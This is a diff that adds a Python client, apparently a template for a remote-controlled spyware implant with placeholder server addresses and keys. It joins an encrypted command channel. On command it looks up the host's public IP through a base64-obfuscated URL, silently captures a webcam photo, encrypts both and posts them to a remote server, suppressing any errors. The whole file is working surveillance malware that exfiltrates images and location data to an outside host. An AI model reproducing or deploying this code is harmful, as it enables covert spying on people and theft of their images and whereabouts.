@@ -1,0 +1,56 @@
+import requests,cv2,base64,json,hashlib
+import socket
+from pack.S_Clustr_AES import S_Clustr_AES_CBC
+from Crypto.Cipher import AES
+
+def get_ip(): return requests.get(base64.b64decode('aHR0cDovL3d3dy4zMzIyLm9yZy9keW5kbnMvZ2V0aXA=').decode(), headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).text.strip() if requests.get(base64.b64decode('aHR0cDovL3d3dy4zMzIyLm9yZy9keW5kbnMvZ2V0aXA=').decode(), headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).text.strip() else None
+def take_photo():
+    camera_device = 0
+    cap = cv2.VideoCapture(camera_device)
+    if not cap.isOpened(): return ''
+    _, frame = cap.read()
+    _, buffer = cv2.imencode('.jpg', frame)
+    jpg_as_text = base64.b64encode(buffer).decode('utf-8')
+    cap.release();cv2.destroyAllWindows();return 'data:image/png;base64,' + jpg_as_text
+def remote_server(data):
+    try:
+        requests.post(base64.b64decode('@NETS3E_SERVER').decode(),
+                      headers={'User-Agent': 'Mozilla/5.0'},
+                      timeout=1,
+                      data=data)
+    except:pass
+def encrypt_with_salt(plaintext,password):
+    salt=hashlib.sha256(password.encode()).digest()[:16];key,iv=derive_key_and_iv(password.encode(),salt);cipher=AES.new(key,AES.MODE_CBC,iv);padded_plaintext=pad(plaintext.encode(),AES.block_size);return salt+cipher.encrypt(padded_plaintext)
+def decrypt_with_salt(ciphertext,password):
+    salt,ciphertext=ciphertext[:16],ciphertext[16:];key,iv=derive_key_and_iv(password.encode(),salt);cipher=AES.new(key,AES.MODE_CBC,iv);decrypted_text=cipher.decrypt(ciphertext);plaintext=unpad(decrypted_text);return plaintext.decode('utf-8')
+def pad(s,size):padding_size=size-len(s)%size;return s+bytes([padding_size]*padding_size)
+def unpad(s):padding_size=s[-1];return s[:-padding_size]
+def derive_key_and_iv(password,salt):
+    d=d_i=b''
+    while len(d)<48:
+        d_i=hashlib.md5(d_i+password+salt).digest();d+=d_i
+    return d[:32],d[32:48]
+
+
+def main():
+    AESS = S_Clustr_AES_CBC()
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    SERVER_ADDRESS = ('@SERVER_IP', @SERVER_PORT)
+    client_socket.connect(SERVER_ADDRESS)
+    data = AESS.aes_cbc_encode("@S_CLUSTR_KEY", '{"TYPE": "Nets3e"}')
+    client_socket.send(data.encode('utf-8'))
+    while True:
+        data=AESS.aes_cbc_decode("@S_CLUSTR_KEY",client_socket.recv(1024).decode('utf-8'))
+        if data=="@SERVER_RUN":
+            ip=get_ip()
+            if ip:remote_server(encrypt_with_salt(json.dumps({'IP':ip,'Photo':take_photo()}),"@NET_SALT"))
+            client_socket.send(AESS.aes_cbc_encode("@S_CLUSTR_KEY","@RESPON_RUN").encode('utf-8'))
+        elif data=="@SERVER_STOP":
+            client_socket.send(AESS.aes_cbc_encode("@S_CLUSTR_KEY","@RESPON_STOP").encode('utf-8'))
+            break
+    client_socket.close()
+
+
+if __name__=='__main__':
+    main()
+
